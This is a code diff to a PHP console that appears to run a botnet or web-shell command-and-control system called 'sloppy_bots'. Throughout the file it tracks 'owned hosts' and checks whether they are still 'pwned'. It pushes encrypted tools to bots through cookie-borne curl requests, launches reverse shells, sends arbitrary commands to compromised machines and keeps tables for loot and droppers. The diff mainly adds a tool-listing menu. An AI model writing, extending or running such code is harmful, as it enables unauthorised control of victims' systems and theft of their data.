@@ -27,7 +27,7 @@ $cof = array(
 //$success = null;
 //$te = system("bg $( which bash ) -c 'nohup proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High &'", $success);
 is_file("includes/config/sloppy_config.ini") ? define("config", parse_ini_file('includes/config/sloppy_config.ini', true)) : define("config", $cof);
-if (empty(config['password'])) {
+if (empty(config['pass'])) {
     define('DBCONN', sprintf("host=%s port=%s user=%s dbname=%s",
         config['sloppy_db']['host'],
         config['sloppy_db']['port'],
@@ -39,7 +39,7 @@ if (empty(config['password'])) {
         config['sloppy_db']['host'],
         config['sloppy_db']['port'],
         config['sloppy_db']['user'],
-        config['sloppy_db']['password'],
+        config['sloppy_db']['pass'],
         config['sloppy_db']['dbname']
     ));
 }
@@ -131,7 +131,8 @@ function menu()
         (A)dd new host                                                              
         (CH)eck if hosts are still pwned
         (AT) Add tool
-        (UP)load tool to bot                                            
+        (UP)load tool to bot
+        (L)ist (T)ools                                            
         (M)ain menu                                                                 
         (Q)uit                                                                      
 _MENU;
@@ -139,15 +140,16 @@ _MENU;
 
 }
 
+
 function b64(array $what, $how, array $whereWeGo)
 {
     curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
     curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
     curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
     curl_setopt(CHH, CURLOPT_POST, true);
-    $our_nonce = random_bytes(24);
-    $secure_Key = random_bytes(32);
-    $additionalData = random_bytes(16);
+    $our_nonce = openssl_random_pseudo_bytes(24);
+    $secure_Key = openssl_random_pseudo_bytes(32);
+    $additionalData = openssl_random_pseudo_bytes(16);
     if ($how === "u") {
         //UPLOAD IS CURRENTLY UNTESTED. if there are bugs, lemme know.
 
@@ -167,7 +169,7 @@ function b64(array $what, $how, array $whereWeGo)
         $basedHashUpload = base64_encode($additionalData.".".$our_nonce.".".$secure_Key.".".$needed_values);
         curl_setopt(CHH, CURLOPT_COOKIE, "cb64=U.".hash("sha512", $basedHashUpload, $binary=false)."; jsessionid=". $basedHashUpload);
     }elseif ($how === "D"){
-        awesomeMenu();
+        awesomeMenu("hosts");
         $result = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", trim(readline("Which host?(by ID)->"))));
         $wheretoGo = pg_fetch_row($result);
         $tool = sodium_crypto_aead_xchacha20poly1305_ietf_encrypt(base64_encode(serialize($what)), $additionalData, $our_nonce, $secure_Key);
@@ -204,7 +206,7 @@ function sloppyTools(string $action, $pathToFile, $toolName, bool $encrypted)
                 case "sh":
                     echo "Shell script detected.\n";
                     $toolTarget = 'lin';
-                    $language = 'bash/shell scripting';
+                    $language = 'bash';
                     break;
                 case "ps1":
                     echo "Powershell script detected.\n";
@@ -234,12 +236,12 @@ function sloppyTools(string $action, $pathToFile, $toolName, bool $encrypted)
                 case "so":
                     echo "Shared Object detected.\n";
                     $toolTarget = 'linux';
-                    $language = 'shared object guesing: c/c++';
+                    $language = 'shared object';
                     break;
                 case "lib":
                     echo "Library detected.\n";
                     $toolTarget = 'linux';
-                    $language = 'library object guessing: c/c++';
+                    $language = 'library object';
                     break;
                 case "bat":
                     echo "Batch script detected.\n";
@@ -249,7 +251,7 @@ function sloppyTools(string $action, $pathToFile, $toolName, bool $encrypted)
                 case "vbs":
                     echo "Visual Basic script detected.\n";
                     $toolTarget = 'win';
-                    $language = 'visual basic script';
+                    $language = 'vbs';
                     break;
             }
             if ($encrypted === true) {
@@ -353,15 +355,14 @@ function sloppyTools(string $action, $pathToFile, $toolName, bool $encrypted)
 
 function opts()
 {
+    system(clears);
     $ppg = pg_connect(DBCONN);
     print("\n\nCurrent options enabled:\n\n");
-    foreach (config as $temp => $values) {
-        print($temp . " => " . $values . "\n");
-    }
+    print(print_r(config)."\n");
     print("\n\n" . str_repeat("-", 35) . "\n");
     print("\n\nCurrent DB Status:\n\n");
     if ($ppg == PGSQL_CONNECTION_OK or $ppg == PGSQL_CONNECTION_AUTH_OK) {
-        print("\nConnected!");
+        print("\nConnected!\n\n");
         print("\nPG Host: " . pg_host($ppg));
         print("\nPG Port: " . pg_port($ppg));
         print("\nPG Ping? " . pg_ping($ppg));
@@ -627,33 +628,62 @@ function aHo($host, $os, $checkIn)
     }
 }
 
-function awesomeMenu()
+function awesomeMenu(string $what)
 {
-    $axx = pg_exec(pg_connect(DBCONN), "SELECT * FROM sloppy_bots_main");
-    $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
-    echo str_repeat("+", 35) . "[ OWNED HOSTS ]" . str_repeat("+", 39) . "\n\n";
-    $a = 0;
-    foreach (pg_fetch_all($axx) as $tem => $use) {
-        print(sprintf("[ ID: ]-> %s [ RHOST: ]-> %s [ URI: ]-> %s [ OS_FLAVOR: ]-> %s [ CHECKED_IN: ]-> %s\n",
-            $use['id'],
-            $use['rhost'],
-            $use['uri'],
-            $use['os_flavor'],
-            $use['check_in']
-        ));
+    system(clears);
+    $sloppy_tables = array(
+        "tools" => "sloppy_bots_tools",
+        "loot" => "sloppy_bots_loot",
+        "domains" => "sloppy_bots_domains",
+        "droppers" => "sloppy_bots_droppers",
+        "main" => "sloppy_bots_main"
+    );
+    switch ($what){
+        case "hosts":
+            $axx = pg_exec(pg_connect(DBCONN), "SELECT * FROM sloppy_bots_main");
+            $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
+            echo str_repeat("+", 35) . "[ OWNED HOSTS ]" . str_repeat("+", 39) . "\n\n";
+            $a = 0;
+            foreach (pg_fetch_all($axx) as $tem => $use) {
+                print(sprintf("[ ID: ]-> %s [ RHOST: ]-> %s [ URI: ]-> %s [ OS_FLAVOR: ]-> %s [ CHECKED_IN: ]-> %s\n",
+                    $use['id'],
+                    $use['rhost'],
+                    $use['uri'],
+                    $use['os_flavor'],
+                    $use['check_in']
+                ));
+            }
+            pg_free_result($count);
+            pg_free_result($axx);
+            echo "\n\n" . str_repeat("+", 35) . "[ END OWNED HOSTS ]" . str_repeat("+", 35) . "\n\n";
+            break;
+        default:
+            print(str_repeat("+", 35)."[ -> {$what} in DB <- ]". str_repeat("+", 27)."\n");
+            foreach(pg_fetch_all(pg_exec(pg_connect(DBCONN), sprintf("SELECT * FROM %s", $sloppy_tables[$what]))) as $item){
+                if ($item['encrypted'] === "t") {
+                    $enc = "True";
+                }else{
+                    $enc = "False";
+                }
+                print(sprintf("[ ID: ]-> %s [ NAME: ]-> %s [ OS_Target: ]-> %s [ Encrypted: ]-> %s\n",
+                    $item['id'],
+                    $item['tool_name'],
+                    $item['target'],
+                    $enc
+                ));
+            }
+            print(str_repeat("+", 35)."[ -> End <- ]". str_repeat("+", 35)."\n");
+            print(print_r(pg_fetch_row(pg_exec(pg_connect(DBCONN), sprintf("SELECT * FROM %s WHERE id = '%s'", $sloppy_tables[$what], trim(readline("[ ?? ] Please select what you want ->")))))));
+            break;
     }
-    pg_free_result($count);
-    pg_free_result($axx);
-    echo "\n\n" . str_repeat("+", 35) . "[ END OWNED HOSTS ]" . str_repeat("+", 35) . "\n\n";
+
 }
 
 function check($host, $path, $batch)
 {
-    $curlHandle = CHH;
     if ($batch === "y") {
-        $c = pg_exec(pg_connect(DBCONN), "SELECT check_in,rhost,uri FROM sloppy_bots_main WHERE rhost IS NOT NULL");
         $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
-        $rows = pg_fetch_all($c);
+        $rows = pg_fetch_all(pg_exec(pg_connect(DBCONN), "SELECT check_in,rhost,uri FROM sloppy_bots_main WHERE rhost IS NOT NULL"));
         echo "Pulling: " . pg_fetch_result($count, null, null) . "\nThis could take awhile.";
         curl_setopt(CHH, CURLOPT_TIMEOUT, 5);
         curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 5);
@@ -780,6 +810,25 @@ while ($run) {
     $lc = $pw;
     logo($lc, clears, "", "", '');
     switch (strtolower($pw)) {
+        case "lt":
+            awesomeMenu("tools");
+            break;
+        case "at":
+            $add = trim(readline("Do we need to add it to the db? (add/grab) -> "));
+            if ($add === "add") {
+                $ourTool = trim(readline("Full path to tool-> "));
+                $dcrypt = trim(readline("Do we need to encrypt it?-> "));
+                if ($dcrypt === 'n') {
+                    $encrypt = false;
+                } else {
+                    $encrypt = true;
+                }
+                $name = trim(readline("Is there a name for it already, or what do you call it.? ->"));
+                sloppyTools($add, $ourTool, $name, $encrypt);
+            } else {
+                sloppyTools($add, '', '', '');
+            }
+            break;
         case "up":
             b64(array('read' => trim(readline("Which file are we trying to download?(full path please)-> "))), "D", array());
             break;
@@ -803,7 +852,7 @@ while ($run) {
             break;
         case "sys":
             system(clears);
-            awesomeMenu();
+            awesomeMenu("hosts");
             $h = readline("Which host are we checking?\n->");
             try {
                 sys($h);
@@ -813,7 +862,7 @@ while ($run) {
             break;
         case "rev":
             system(clears);
-            awesomeMenu();
+            awesomeMenu("hosts");
             $h = readline("Please tell me the host.(default is the host sending this request.)\n->");
             $p = readline("\nWhich port shall we use?(default is 1634)\n->");
             $m = readline("Which method is to be used?(default is bash)\n->");
@@ -825,7 +874,7 @@ while ($run) {
         case "com":
             system(clears);
             try {
-                awesomeMenu();
+                awesomeMenu("hosts");
                 $h = readline("Which host are we sending the command to?\n->");
                 $c = readline("And now the command: \n->");
                 $e = readline("Are we needing to encrypt?\n(y/n)->");
@@ -845,7 +894,7 @@ while ($run) {
         case "cl":
             system(clears);
             try {
-                awesomeMenu();
+                awesomeMenu("hosts");
                 $h = readline("Which host are we interacting with?\n->");
                 $rep = readline("Repo to clone?\n->");
                 clo($h, $rep, queryDB($h, "cl"));
@@ -883,7 +932,7 @@ while ($run) {
                         break;
                     case "n":
                         echo "Not executing batch job.\n";
-                        awesomeMenu();
+                        awesomeMenu("hosts");
                         $h = readline("Who is it we need to check on?(based on ID)\n->");
                         check($h, "chR", "n");
                         break;
@@ -904,22 +953,6 @@ while ($run) {
             break;
         case "o":
             opts();
-            break;
-        case "at":
-            $add = trim(readline("Do we need to add it to the db? (add/grab) -> "));
-            if ($add === "add") {
-                $ourTool = trim(readline("Full path to tool-> "));
-                $dcrypt = trim(readline("Do we need to encrypt it?-> "));
-                if ($dcrypt === 'n') {
-                    $encrypt = false;
-                } else {
-                    $encrypt = true;
-                }
-                $name = trim(readline("Is there a name for it already, or what do you call it.? ->"));
-                sloppyTools($add, $ourTool, $name, $encrypt);
-            } else {
-                sloppyTools($add, '', '', '');
-            }
             break;
         default:
             logo($lc, clears, "", "", '');
